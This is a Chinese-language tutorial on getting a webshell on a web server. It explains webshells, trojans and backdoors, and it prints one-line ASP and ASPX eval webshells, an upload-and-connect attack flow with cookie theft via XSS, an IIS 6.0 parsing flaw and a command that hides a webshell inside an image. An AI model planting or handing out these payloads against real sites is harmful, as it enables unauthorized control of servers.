getshell：3步控制目标服务器

1、什么是Web-shell?

web 的含义显然是需要服务器开放web服务

shell 是一个人机交互页面

拿 shell”的含义是取得对服务器/电脑某种程度上的操作权限。

webshell拿到网站服务器的权限（shell）。

webshell就是以asp、php、jsp或者cgi等网页文件形式存在的命令执行环境，也可以将其称作为一种网页后门。

2、木马

什么是木马：木马是指未经用户同意进行非授权操作的一种恶意程序。它们可能删除硬盘上的数 据，使系统瘫痪，盗取用户资料等。木马程序不能独立侵入计算机，而是要依靠黑客 来进行传播，它们常常被伪装成“正常”软件进行散播。

木马可以帮助我们拿到shell，以达到控制网站服务器的目的，也有人称之为网站的后门工具。

3、什么是后门？

后门是指一种绕过安全性控制而取对程序或系统访问权的方法。在软件的开发阶段，程序员常会在软件内创建后门便于可以修改程序中的缺陷。如果这些后门被其他人知道或者发布软件之前没有删除后门程序那么他就存在安全隐患容易被黑客当成漏洞进行攻击！
这里指的是后门是给不法分子留下访问路径,达到偷窥的目的

普通的ASP一句话木马（一句话木马：通常是一句话那么长的 eval后门。）

<%  eval  request ("abcdefg")   %>

eval 执行
request 从用户那里取得的信息
木马：执行从用户那里取得的信息

什么是一句话木马？

什么是一句话木马？

一句话木马就是一句简单的脚本语言，常见脚本语言的一句话木马如下：

php：

asp：<%eval request (“pass”)%>

aspx：<%@ Page Language=”Jscript”%> <%eval(Request.Item[“pass”],”unsafe”);%>

一句话木马的使用

以php一句话为例，我们可以直接将这些语句插入到网站的某个php文件上，或者直接创建一个新的文件，在文件里写入一句话木马，然后把文件上传到网站上即可。

Shell文件可从服务端接收数据并执行、返回结果

小马：通常是一个体积小的变形后门，主要用途是上传大马（一般只有上传功能）。

大马：自带多功能的后门，通常为了方便使用，体积大不容易过WAF

小马是用来上传大马的

流程：

1、进入网站后台，找到上传点。 eg：利用xss—拿到cookie

2、上传木马

3、连菜刀，拿到shell

如何寻找上传点？需要找到能上传文件的地方，比如图片，附件等，其次需要我们上传的文件被执行

一句话是不是上传之后就能用？不是，需要知道他的路径，且能被执行

4、文件解析漏洞

是指中间件（Apache、nginx、iis等）在解析文件时出现了漏洞，从而，黑客可以利用该漏洞实现非法文件的解析。

eg: iis6.0默认把asa，cdx，cer文件 当作asp文件来执行。

5、制作图片马

copy 1.png/b+1.asp b.png

copy 图片名字/b + 文件名字 图片马名字

为什么要制作图片马？

因为网站监测了我们的上传内容，我们需要将文件头内容修改成合适的内容，而图片马是一种方式

菜刀连接的原理是什么？

菜刀通过访问刚刚的asp一句话，向里面的参数传递不同的指令，一句话执行相应的 指令，然后将结果返回给我们
